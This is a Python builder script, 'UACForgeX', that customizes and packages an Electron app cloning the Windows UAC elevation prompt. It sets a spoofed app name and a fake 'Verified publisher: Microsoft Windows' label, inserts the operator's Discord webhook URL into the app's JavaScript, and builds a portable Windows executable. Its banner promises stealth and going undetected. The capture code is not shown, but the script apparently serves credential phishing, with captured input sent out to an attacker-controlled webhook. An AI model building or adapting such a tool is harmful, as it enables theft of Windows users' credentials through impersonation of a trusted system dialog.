#!/usr/bin/env python3
import os
import re
import shutil
import subprocess
import json
from pathlib import Path
import sys
import time

BOLD = '\033[1m' if os.name != 'nt' else ''
BLUE = '\033[94m' if os.name != 'nt' else ''
GREEN = '\033[92m' if os.name != 'nt' else ''
RED = '\033[91m' if os.name != 'nt' else ''
RESET = '\033[0m' if os.name != 'nt' else ''

def print_banner():
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    CYAN = "\033[96m"
    MAGENTA = "\033[35m"

    banner = f"""
{MAGENTA}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{BLUE}{BOLD}{UNDERLINE}   UACForgeX {MAGENTA}- Ultimate UAC Prompt Clone Builder{RESET}
{MAGENTA}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{CYAN}{BOLD}   [ * ] Create. Customize. Control.{RESET}
{GREEN}{BOLD}   [ * ] Build your UAC Prompt Clone with stealth and precision.{RESET}

{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{MAGENTA}    Ready to manipulate? Elevate your control. Go undetected. 
{RESET}
"""
    time.sleep(0.5)

    print(banner)

def print_success(message):
    """Print a success message."""
    print(f"{GREEN}✓ {message}{RESET}")

def print_error(message):
    """Print an error message."""
    print(f"{RED}✗ {message}{RESET}")

def print_info(message):
    """Print an info message."""
    print(f"{BLUE}ℹ {message}{RESET}")

def get_project_dir():
    """Get the project directory."""
    return Path(__file__).parent.absolute()

def get_user_input(prompt, default=""):
    """Get user input with a default value."""
    if default:
        result = input(f"{prompt} [{default}]: ") or default
    else:
        result = input(f"{prompt}: ")
    return result

def update_app_name(app_name, publisher):
    """Update the application name and publisher in index.html."""
    project_dir = get_project_dir()
    html_path = project_dir / "index.html"
    
    if not html_path.exists():
        print_error(f"index.html not found in {project_dir}")
        return False
    
    try:
        with open(html_path, 'r', encoding='utf-8') as file:
            html_content = file.read()
        
        # Update app name
        app_name_pattern = r'<p class="app-name">.*?</p>'
        if re.search(app_name_pattern, html_content):
            html_content = re.sub(
                app_name_pattern,
                f'<p class="app-name">{app_name}</p>',
                html_content
            )
        else:
            print_error("Could not find app name in HTML")
            return False
        
        # Update publisher
        publisher_pattern = r'<p class="publisher">Verified publisher: .*?</p>'
        if re.search(publisher_pattern, html_content):
            html_content = re.sub(
                publisher_pattern,
                f'<p class="publisher">Verified publisher: {publisher}</p>',
                html_content
            )
        else:
            print_error("Could not find publisher in HTML")
            return False
        
        # Write the updated content back to the file
        with open(html_path, 'w', encoding='utf-8') as file:
            file.write(html_content)
        
        print_success(f"Updated application name: {app_name}")
        print_success(f"Updated publisher: {publisher}")
        return True
    
    except Exception as e:
        print_error(f"Error updating app name and publisher: {e}")
        return False

def update_discord_webhook(webhook_url):
    """Update the Discord webhook URL in index.js."""
    project_dir = get_project_dir()
    js_path = project_dir / "index.js"
    
    if not js_path.exists():
        print_error(f"index.js not found in {project_dir}")
        return False
    
    try:
        with open(js_path, 'r', encoding='utf-8') as file:
            js_content = file.read()
        
        # Look for different webhook URL patterns
        webhook_patterns = [
            r'(const DISCORD_WEBHOOK_URL = [\'"]).*?([\'"];)',
            r'(process\.env\.DISCORD_WEBHOOK_URL \|\| [\'"]).*?([\'"])',
            r'(https://discord\.com/api/webhooks/).*?([\'"])'
        ]
        
        updated = False
        for pattern in webhook_patterns:
            if re.search(pattern, js_content):
                js_content = re.sub(
                    pattern,
                    r'\1' + webhook_url + r'\2',
                    js_content
                )
                updated = True
                break
        
        if not updated:
            # Try to find the line for the webhook URL
            lines = js_content.split('\n')
            webhook_line = -1
            
            for i, line in enumerate(lines):
                if "DISCORD_WEBHOOK_URL" in line:
                    webhook_line = i
                    break
            
            if webhook_line >= 0:
                # Found the line, replace it
                lines[webhook_line] = f"const DISCORD_WEBHOOK_URL = '{webhook_url}';"
                js_content = '\n'.join(lines)
                updated = True
            else:
                # Add a new webhook URL line after the first require statements
                import_end = 0
                for i, line in enumerate(lines):
                    if line.strip().startswith('const ') and 'require' in line:
                        import_end = i
                
                if import_end > 0:
                    lines.insert(import_end + 1, f"const DISCORD_WEBHOOK_URL = '{webhook_url}';")
                    js_content = '\n'.join(lines)
                    updated = True
        
        if updated:
            with open(js_path, 'w', encoding='utf-8') as file:
                file.write(js_content)
            print_success(f"Updated Discord webhook URL")
            return True
        else:
            print_error("Could not update webhook URL - file structure not recognized")
            return False
    
    except Exception as e:
        print_error(f"Error updating webhook URL: {e}")
        return False

def update_icon(icon_path):
    """Update the application icon."""
    if not icon_path or not os.path.exists(icon_path):
        print_info("No icon specified or file not found. Using default icon.")
        return False
    
    project_dir = get_project_dir()
    assets_dir = project_dir / "assets"
    
    # Create assets directory if it doesn't exist
    if not assets_dir.exists():
        assets_dir.mkdir(exist_ok=True)
    
    icon_file = Path(icon_path)
    
    try:
        # Copy the icon to the assets directory
        if icon_file.suffix.lower() in ['.svg', '.png', '.jpg', '.jpeg']:
            new_icon_path = assets_dir / f"custom-icon{icon_file.suffix.lower()}"
            shutil.copy(icon_file, new_icon_path)
            print_success(f"Copied icon to {new_icon_path}")
            
            # Update the icon in the HTML
            html_path = project_dir / "index.html"
            if html_path.exists():
                with open(html_path, 'r', encoding='utf-8') as file:
                    html_content = file.read()
                
                # Find and update the icon path
                icon_pattern = r'(<div class="app-icon">\s*<img src=")([^"]*)'
                if re.search(icon_pattern, html_content):
                    html_content = re.sub(
                        icon_pattern,
                        r'\1assets/custom-icon' + icon_file.suffix.lower(),
                        html_content
                    )
                    
                    with open(html_path, 'w', encoding='utf-8') as file:
                        file.write(html_content)
                    
                    print_success(f"Updated icon reference in HTML")
                    return True
                else:
                    print_error("Could not find icon reference in HTML")
            else:
                print_error("index.html not found")
            
            return False
        else:
            print_error(f"Unsupported icon format: {icon_file.suffix}")
            print_info("Supported formats: SVG, PNG, JPG, JPEG")
            return False
    
    except Exception as e:
        print_error(f"Error updating icon: {e}")
        return False

def check_files():
    """Check if all required files are present."""
    project_dir = get_project_dir()
    required_files = ["index.js", "index.html", "preload.js", "renderer.js", "styles.css"]
    missing_files = []
    
    for file in required_files:
        if not (project_dir / file).exists():
            missing_files.append(file)
    
    if missing_files:
        print_error(f"Missing required files: {', '.join(missing_files)}")
        print_info("Please run this script from the UAC Prompt Clone directory")
        return False
    
    return True

def update_package_json(app_name, icon_path=None):
    """Update the package.json file for building with electron-builder."""
    project_dir = get_project_dir()
    package_path = project_dir / "package.json"
    
    if not package_path.exists():
        print_error("package.json not found. Creating a new one...")
        try:
            subprocess.run(['npm', 'init', '-y'], check=True, cwd=str(project_dir))
            print_success("Created new package.json")
            
            # Check if it was successfully created
            if not package_path.exists():
                print_error("Failed to create package.json")
                return False
        except subprocess.CalledProcessError as e:
            print_error(f"Error creating package.json: {e}")
            return False
    
    try:
        # Read the current package.json
        with open(package_path, 'r', encoding='utf-8') as file:
            try:
                package_data = json.load(file)
            except json.JSONDecodeError:
                print_error("Invalid package.json format. Creating a new one...")
                subprocess.run(['npm', 'init', '-y'], check=True, cwd=str(project_dir))
                with open(package_path, 'r', encoding='utf-8') as new_file:
                    package_data = json.load(new_file)
        
        # Update basic package info
        package_data["main"] = "index.js"
        package_data["description"] = "Windows UAC Prompt Clone application"
        
        # Add scripts if they don't exist
        if "scripts" not in package_data:
            package_data["scripts"] = {}
        
        package_data["scripts"]["start"] = "electron ."
        package_data["scripts"]["build"] = "electron-builder"
        
        # Add build configuration
        if "build" not in package_data:
            package_data["build"] = {}
        
        package_data["build"]["appId"] = "com.uac.prompt.clone"
        package_data["build"]["productName"] = app_name or "UAC Prompt"
        
        if "directories" not in package_data["build"]:
            package_data["build"]["directories"] = {}
        
        package_data["build"]["directories"]["output"] = "dist"
        
        # Configure Windows build
        if "win" not in package_data["build"]:
            package_data["build"]["win"] = {}
        
        package_data["build"]["win"]["target"] = "portable"
        
        # Update icon if provided
        if icon_path and os.path.exists(icon_path):
            icon_file = Path(icon_path)
            
            # For electron-builder, we need to use a PNG icon
            if icon_file.suffix.lower() == '.png':
                asset_icon_path = f"assets/icon.png"
                icon_dest = project_dir / "assets" / "icon.png"
                
                # Create assets directory if it doesn't exist
                assets_dir = project_dir / "assets"
                if not assets_dir.exists():
                    assets_dir.mkdir(exist_ok=True)
                
                # Copy the icon
                shutil.copy(icon_path, icon_dest)
                print_success(f"Copied icon to {icon_dest}")
                
                # Set the icon in package.json
                package_data["build"]["win"]["icon"] = asset_icon_path
        else:
            # Ensure we have a default icon for the build
            default_icon = project_dir / "assets" / "icon.png"
            if not default_icon.exists():
                assets_dir = project_dir / "assets"
                if not assets_dir.exists():
                    assets_dir.mkdir(exist_ok=True)
                # We'll create a simple placeholder icon if needed
                print_info("No icon specified, using default icon")
        
        # Write the updated package.json back
        with open(package_path, 'w', encoding='utf-8') as file:
            json.dump(package_data, file, indent=2)
        
        print_success("Updated package.json configuration")
        return True
    
    except Exception as e:
        print_error(f"Error updating package.json: {e}")
        return False

def check_npm_installed():
    """Check if npm is installed and available in the PATH."""
    try:
        npm_version = subprocess.run(
            ['npm', '--version'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
            universal_newlines=True
        )
        if npm_version.returncode == 0:
            return True
        return False
    except Exception:
        return False

def run_npm_command(command):
    """Run an npm command directly with appropriate output."""
    project_dir = get_project_dir()
    
    print_info(f"Running: npm {command}")
    
    try:
        # Use os.system to show live output directly
        result = os.system(f"cd {project_dir} && npm {command}")
        
        if result == 0:
            return True
        else:
            print_error(f"Command 'npm {command}' failed with exit code {result}")
            return False
    except Exception as e:
        print_error(f"Error running 'npm {command}': {e}")
        return False

def build_executable():
    """Build the application using electron-builder."""
    project_dir = get_project_dir()
    
    print_info("Building executable...")
    print_info("This may take a few minutes...")
    
    # First install electron-builder
    print_info("Installing electron-builder...")
    install_success = run_npm_command("install --save-dev electron-builder")
    
    if install_success:
        print_success("Installed electron-builder")
    else:
        print_error("Failed to install electron-builder")
        print_info("Continuing anyway...")
    
    # Pause briefly to make sure npm has time to update package.json properly
    time.sleep(1)
    
    # Now run the build
    print_info("Running build process...")
    build_success = run_npm_command("run build")
    
    if build_success:
        print_success("Successfully built the executable!")
        print_info("The executable is located in the 'dist' folder")
        return True
    else:
        print_error("Build process failed.")
        print_info("Try running these commands manually:")
        print_info("1. npm install --save-dev electron-builder")
        print_info("2. npm run build")
        return False

def yes_no_prompt(question, default=True):
    """Ask a yes/no question."""
    default_text = "Y/n" if default else "y/N"
    response = input(f"{question} [{default_text}]: ").strip().lower()
    
    if not response:
        return default
    
    return response.startswith('y')

def main():
    """Main function to run the customizer."""
    print_banner()
    
    if not check_files():
        sys.exit(1)
    
    print_info("Please enter your customization options:")
    
    # Get customization options from the user
    app_name = get_user_input(
        "Enter the application name to be displayed",
        "Printer driver software installation"
    )
    
    publisher = get_user_input(
        "Enter the publisher name",
        "Microsoft Windows"
    )
    
    webhook_url = get_user_input(
        "Enter your Discord webhook URL"
    )
    
    icon_path = get_user_input(
        "Enter path to icon file (SVG, PNG, JPG) - leave empty to use default"
    )
    
    # Ask if they want to build the executable
    build_exe = yes_no_prompt("Do you want to build the executable now?")
    
    print("\n== Updating application text ==")
    # Apply customizations
    update_app_name(app_name, publisher)
    
    if webhook_url:
        print("\n== Updating Discord webhook ==")
        update_discord_webhook(webhook_url)
    else:
        print_info("No webhook URL provided, skipping webhook update")
    
    if icon_path:
        print("\n== Updating application icon ==")
        update_icon(icon_path)
    
    if build_exe:
        print("\n== Building executable ==")
        # Update package.json for the build
        print("\n== Updating package.json for build ==")
        update_package_json(app_name, icon_path)
        
        # Build the executable
        build_executable()
    
    print()
    print_info("Customization completed successfully!")
    
    if build_exe:
        print_info("If the build was successful, the executable can be found in the 'dist' directory.")
        print_info("If the build failed, you can still run the customized application with: npx electron .")
        print_info("Or try to build manually with: npm run build")
    else:
        print_info("You can now run the application with: npx electron .")
        print_info("To build the executable later, run this script again and choose the build option.")
        print_info("Or you can manually build with: npm run build")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")
        sys.exit(1)